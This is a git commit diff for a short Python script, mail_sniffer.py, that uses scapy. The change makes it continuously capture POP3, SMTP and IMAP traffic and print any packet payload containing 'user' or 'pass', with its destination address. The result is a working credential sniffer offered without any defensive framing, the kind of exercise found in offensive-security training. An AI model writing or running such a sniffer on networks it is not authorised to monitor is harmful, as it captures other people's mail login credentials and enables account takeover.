dcf1a5a37a688fd8e78fc2dff90177c76afb8735
youshitsune <luka@youshitsune.me>
2023-02-04 22:46:08 +0100

    Make a mail sniffer better

--- mail_sniffer.py
+++ mail_sniffer.py
@@ -1,10 +1,14 @@
-from scapy.all import sniff
+from scapy.all import sniff, TCP, IP
 
 def packet_callback(packet):
-    print(packet.show())
+    if packet[TCP].payload:
+        mypacket = str(packet[TCP].payload)
+        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
+            print(f"[*] Destination: {packet[IP].dst}")
+            print(f"[*] {str(packet[TCP].payload)}")
 
 def main():
-    sniff(prn=packet_callback, count=1)
+    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)
 
 if __name__ == "__main__":
     main()
